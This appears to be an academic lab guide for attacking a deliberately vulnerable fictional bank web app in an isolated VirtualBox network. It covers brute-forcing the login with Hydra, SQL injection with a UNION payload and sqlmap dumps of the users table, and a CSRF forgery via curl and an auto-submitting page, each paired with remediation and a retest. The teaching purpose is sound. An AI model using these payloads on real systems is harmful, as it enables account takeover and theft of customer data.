# Aurelia Bank — Attack Simulation Guide (Kali Linux + VirtualBox)

**Academic cybersecurity project — Phases 7 & 8.**
This guide walks through the three controlled vulnerabilities against the
*real* Aurelia Bank functionality, using a Kali Linux attacker VM in an isolated
VirtualBox network.

> ⚠️ **Authorized, isolated use only.** Everything here is fictional (no real
> money, accounts, or people). Run these attacks **only** against your own
> Aurelia Bank instance inside a private VirtualBox network that has **no route
> to the internet or any third party**. Never point these tools at any system
> you do not own and control.

---

## Contents

1. [How the vulnerabilities are wired (toggle model)](#1-how-the-vulnerabilities-are-wired)
2. [Lab environment & network setup](#2-lab-environment--network-setup)
3. [Deploy & seed the victim app](#3-deploy--seed-the-victim-app)
4. [Test accounts](#4-test-accounts)
5. [Attack 1 — Brute Force (login)](#5-attack-1--brute-force-login)
6. [Attack 2 — SQL Injection (transaction search)](#6-attack-2--sql-injection-transaction-search)
7. [Attack 3 — CSRF (profile update)](#7-attack-3--csrf-profile-update)
8. [Evidence checklist](#8-evidence-checklist)
9. [Reset between runs](#9-reset-between-runs)

---

## 1. How the vulnerabilities are wired

The application is **secure by default**. Each vulnerability is a single
clearly-isolated code branch gated behind a configuration flag:

| Flag | Target file(s) | Off (default) | On (armed) |
|------|----------------|---------------|------------|
| `VULN_BRUTE_FORCE` | `includes/auth.php`, `includes/security.php` | Login lockout after 5 fails / 15 min | No rate limiting |
| `VULN_SQLI` | `includes/banking.php` | Parameterised search query | Search term concatenated raw |
| `VULN_CSRF` | `customer/profile.php` | CSRF token required (POST only) | No token; also accepts GET |

You arm a flag by editing **`config/config.local.php`** on the victim VM.
The provided template `config/config.lab.sample.php` already contains all three.

**Run one attack at a time** — enable only the flag you are demonstrating and
leave the others `false`. This keeps evidence clean and mirrors the
*Normal → Vulnerable → Test → Remediation → Retest* model: setting the flag back
to `false` is the remediation, and re-running the same attack is the retest.

There is **no visible "security lab" in the UI** — the site always looks and
behaves like an ordinary bank. The flags live only in configuration.

---

## 2. Lab environment & network setup

### VMs

* **Victim VM** — the Aurelia Bank host. Either:
  * a Windows/Linux VM running **XAMPP** (Apache + MySQL/MariaDB + PHP 8.1+), or
  * any VM with a PHP 8.1+ + MySQL stack.
* **Attacker VM** — **Kali Linux** (default tooling: `hydra`, `sqlmap`,
  `curl`, `firefox`, `python3` are pre-installed).

### VirtualBox networking (isolated)

Use a network mode where the two VMs can reach each other but the victim is not
exposed to the internet:

* **Host-Only** or **Internal Network** adapter on both VMs (recommended), or
* a NAT Network shared only by these two VMs.

Confirm reachability, then record the victim's IP (used as `VICTIM` throughout):

```bash
# On the victim VM
ip addr            # Linux   → note the host-only adapter address
ipconfig           # Windows → note the IPv4 address

# On Kali, verify you can reach it
ping -c 3 VICTIM
```

Throughout this guide, replace **`VICTIM`** with that IP (e.g. `192.168.56.101`)
and assume the app is served at **`http://VICTIM/aurelia-bank/`** (the XAMPP
`htdocs/aurelia-bank` layout). If you deployed at the web root, drop the
`/aurelia-bank` path segment everywhere.

---

## 3. Deploy & seed the victim app

On the **victim VM**:

```bash
# 1. Place the project under the web root
#    XAMPP (Windows): C:\xampp\htdocs\aurelia-bank
#    XAMPP (Linux):   /opt/lampp/htdocs/aurelia-bank

# 2. Create the schema (creates the aurelia_bank database + tables)
mysql -u root -p < database/schema.sql

# 3. Configure + arm the lab
cp config/config.lab.sample.php config/config.local.php
#    edit config/config.local.php if your DB creds differ

# 4. Seed fictional users, accounts and transactions
php database/seed_users.php
php database/seed_banking.php
```

Browse to `http://VICTIM/aurelia-bank/` from Kali's Firefox and confirm the
bank loads and you can log in as a test customer.

---

## 4. Test accounts

Created by the seeders (fictional — documented in the README):

| Username | Password | Role |
|----------|--------------|-----------|
| `admin` | `Admin@12345` | administrator (staff portal: `/admin/login.php`) |
| `jdoe` | `Password@123` | customer |
| `msanders` | `Password@123` | customer |

The customer login is at `http://VICTIM/aurelia-bank/auth/login.php`.

---

## 5. Attack 1 — Brute Force (login)

### 5.1 Vulnerable endpoint / function
Customer login `auth/login.php`, which calls `authenticate()`
(`includes/auth.php`). Admin login `admin/login.php` shares the same path.

### 5.2 Precondition
`VULN_BRUTE_FORCE = true` in `config/config.local.php` (rate limiting disabled).

### 5.3 Test setup
Understand the login form so Hydra can drive it:

* Method: **POST** to `/aurelia-bank/auth/login.php`
* Fields: `username`, `password`
* **Failure** response contains the string: `Invalid username or password`
* On success that string is absent (you get a redirect / dashboard).

A demo wordlist is provided at `docs/demo-wordlist.txt` (contains the correct
password `Password@123` plus decoys). Copy it to Kali, or use `rockyou.txt`:

```bash
# rockyou on Kali (already present, just decompress once):
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
```

### 5.4 Testing procedure (Hydra)

```bash
hydra -l jdoe -P docs/demo-wordlist.txt \
  VICTIM http-post-form \
  "/aurelia-bank/auth/login.php:username=^USER^&password=^PASS^:Invalid username or password" \
  -t 8 -f -V
```

* `-l jdoe` — target username (use `-L users.txt` to spray many usernames)
* `-P` — password list
* `http-post-form "path:body:failure_string"` — the failure string after the
  last colon tells Hydra a guess was **wrong**; its absence means success
* `-t 8` concurrent tasks, `-f` stop at first hit, `-V` verbose

### 5.5 Expected vulnerable behavior
Hydra tries every candidate with no throttling and reports the valid pair:

```
[80][http-post-form] host: VICTIM   login: jdoe   password: Password@123
```

### 5.6 Evidence to collect
* Hydra output showing the recovered credential and the number of attempts.
* On the victim, the `login_attempts` table filling up rapidly:
  ```sql
  SELECT username, successful, attempted_at
    FROM login_attempts ORDER BY id DESC LIMIT 20;
  ```
* A count of failed attempts in a short window (shows no lockout kicked in).

### 5.7 Security impact
With no attempt-limiting, an attacker can guess credentials offline-fast against
a live account, enabling account takeover from weak/reused passwords.

### 5.8 Remediation
Set `VULN_BRUTE_FORCE = false`. The hardened path in `authenticate()` calls
`login_is_locked_out()` (`includes/security.php`), which refuses further
attempts once there are `LOGIN_MAX_FAILURES` (5) failed attempts for the
username **or** IP within `LOGIN_WINDOW_SECONDS` (15 min). Further hardening
ideas to discuss: exponential backoff, CAPTCHA after N failures, and generic
timing.

### 5.9 Retest procedure
Re-run the exact Hydra command from 5.4.

### 5.10 Expected secure behavior
After ~5 wrong guesses Hydra no longer sees the plain failure string — the app
returns *"Too many failed attempts. Please wait a few minutes and try again."*
Hydra either reports no valid password or stalls against the lockout. Show the
before/after attempt counts as evidence.

---

## 6. Attack 2 — SQL Injection (transaction search)

### 6.1 Vulnerable endpoint / function
The free-text **search** box on `customer/transactions.php`, handled by
`search_transactions()` → `build_transaction_where_vulnerable()`
(`includes/banking.php`). The injectable parameter is **`q`**.

### 6.2 Precondition
`VULN_SQLI = true`. You must be **logged in as a customer** (the page is behind
`require_role('customer')`), so you need a valid session cookie.

### 6.3 Test setup — capture the session cookie
1. In Kali Firefox, log in as `jdoe` / `Password@123`.
2. Open DevTools → Storage/Network → copy the `AURELIA_SESSION` cookie value.
   (Or use Burp/`curl -c` to capture it.)

The vulnerable query selects **15 columns**; the ones that render as text in the
results table are **reference**, **description**, and **counterparty** — good
places to surface extracted data with a UNION.

### 6.4 Testing procedure

**A. Manual — confirm injection (boolean):**
In the search box (or the URL) try:

```
' OR '1'='1
```

Full URL form:
```
http://VICTIM/aurelia-bank/customer/transactions.php?q=' OR '1'='1
```
This breaks out of the per-user scope and returns transactions belonging to
**all** customers (note other owners' names appearing) — proof the input reaches
the query unsafely.

**B. Manual — UNION data extraction (15 columns):**
Surface other users' credentials into the visible text columns (positions 2, 7,
8 = reference, description, counterparty):

```
none' UNION SELECT 1,username,password_hash,4,5,6,email,role,9,NOW(),11,'USD',13,full_name,15 FROM users-- -
```
Paste as the `q` value. The results table then lists each user's `email`,
`username`/`password_hash` and `role` in the text columns.

> Tip: end payloads with `-- -` (comment) to neutralise the trailing
> `ORDER BY ... LIMIT`. If a UNION errors, the page shows the DB error in
> development mode — useful for **error-based** extraction too.

**C. Automated — sqlmap:**

```bash
sqlmap -u "http://VICTIM/aurelia-bank/customer/transactions.php?q=test&type=&category=" \
  --cookie="AURELIA_SESSION=PASTE_VALUE_HERE" \
  -p q --dbms=mysql --batch --level=2 --risk=2

# enumerate
sqlmap ... -p q --dbms=mysql --batch --dbs
sqlmap ... -p q --dbms=mysql --batch -D aurelia_bank --tables
sqlmap ... -p q --dbms=mysql --batch -D aurelia_bank -T users --dump
```

### 6.5 Expected vulnerable behavior
`' OR '1'='1` returns cross-customer rows; the UNION payload / `sqlmap --dump`
reveals the `users` table including `password_hash` values. sqlmap identifies
the `q` parameter as injectable (boolean/UNION/error/time based).

### 6.6 Evidence to collect
* Screenshot of the results table showing other customers' data / dumped hashes.
* sqlmap output identifying the injectable parameter and the dumped `users` rows.
* The exact payloads used.

### 6.7 Security impact
Full read access to the database (all customers' PII and password hashes)
despite the UI only intending to show the current user's own transactions —
a complete confidentiality break.

> Note: only **read-only** extraction is in scope. The PDO MySQL driver rejects
> stacked statements here, so destructive payloads (`; DROP ...`) do not run —
> keep the demonstration to data disclosure on the fictional dataset.

### 6.8 Remediation
Set `VULN_SQLI = false`. The safe path (`build_transaction_filters()` +
`search_transactions()`) binds every value as a parameter and always scopes to
`a.user_id`, so `q` can never alter the query structure.

### 6.9 Retest procedure
Re-run 6.4 A–C with the flag off.

### 6.10 Expected secure behavior
`' OR '1'='1` is treated as a literal search string (matches nothing / only your
own rows). sqlmap reports the parameter as **not injectable**. No cross-customer
data appears.

---

## 7. Attack 3 — CSRF (profile update)

### 7.1 Vulnerable endpoint / function
The **Personal details** form on `customer/profile.php` (a harmless,
non-financial, non-password change — the designated CSRF target).

### 7.2 Precondition
`VULN_CSRF = true`, and the victim is **logged in** as a customer in the browser
you use to open the attacker page.

### 7.3 Why the PoC uses GET (SameSite note)
Modern browsers default the session cookie to **SameSite=Lax**. Lax does **not**
attach the cookie to a cross-site **POST**, but it **does** attach it to a
top-level **GET navigation**. In the vulnerable build the profile endpoint also
accepts GET, so an auto-submitting GET form performs a genuine cross-site,
authenticated change while carrying the victim's session cookie. This is the
reliable way to show CSRF over the lab's plain-HTTP setup. (A POST variant,
`docs/csrf-poc-post.html`, is included to discuss why Lax usually blocks it.)

### 7.4 Test setup
1. Edit `docs/csrf-poc.html` and replace `VICTIM` with the victim's base URL.
2. Serve it from Kali:
   ```bash
   cd docs
   python3 -m http.server 8000
   ```
3. Note the current profile values (e.g. jdoe's full name is "John Doe").

### 7.5 Testing procedure
In the **same** Firefox that is logged into the bank as `jdoe`, open:

```
http://KALI-IP:8000/csrf-poc.html
```

The page auto-submits. The victim's browser is navigated to the bank and the
change is applied with no interaction beyond opening the attacker page.

**Supplementary proof (no token needed):** show the endpoint accepts a forged
request lacking any CSRF token, using the captured cookie:
```bash
curl -i -b "AURELIA_SESSION=PASTE_VALUE_HERE" \
  "http://VICTIM/aurelia-bank/customer/profile.php?form=profile&full_name=John+Doe+%28CSRF%29&email=john.doe@example.test&phone=%2B1-202-555-0182&address=Changed+via+CSRF"
```

### 7.6 Expected vulnerable behavior
The victim lands on their profile page with a success message and the changed
details — e.g. **Full name** now reads *"John Doe (CSRF-POC)"* — without ever
intending to submit the form. No token was required.

### 7.7 Evidence to collect
* Before/after screenshots of the profile (and the header greeting) showing the
  attacker-chosen value.
* The `audit_logs` entry recording the change:
  ```sql
  SELECT user_id, action, details, created_at
    FROM audit_logs WHERE action='profile.update' ORDER BY id DESC LIMIT 5;
  ```
* The attacker page source and the request (DevTools Network tab).

### 7.8 Security impact
An attacker who lures an authenticated victim to a web page can silently change
that victim's account details — an integrity break and a building block for
larger attacks.

### 7.9 Remediation
Set `VULN_CSRF = false`. The hardened form embeds `csrf_field()` and the handler
calls `csrf_verify()` (`includes/csrf.php`) on POST, rejecting requests without a
valid per-session token; it also stops accepting GET. Discuss additional
defenses: `SameSite=Strict` on the session cookie and `Origin`/`Referer` checks.

### 7.10 Retest procedure
Re-open the attacker page (7.5) with the flag off.

### 7.11 Expected secure behavior
The GET attempt is ignored (POST-only) and any forged POST without the token is
rejected — no change is made and no `profile.update` audit entry appears.
Legitimate updates through the real form (which carries the token) still work.

---

## 8. Evidence checklist

For each attack, capture: the exact command/payload, the tool output, a
before/after screenshot, and the relevant DB rows (`login_attempts`,
`users`/dump, `audit_logs`). Keep the vulnerable-run and hardened-retest
evidence side by side to show the remediation working.

---

## 9. Reset between runs

```bash
# Restore fictional data to a known state (idempotent)
php database/seed_users.php
php database/seed_banking.php

# Clear evidence tables if you want a fresh capture
mysql -u root -p aurelia_bank -e "TRUNCATE login_attempts; TRUNCATE audit_logs;"
```

To move from a vulnerable run to the hardened retest, flip the single relevant
flag in `config/config.local.php` back to `false` and re-run the same attack.
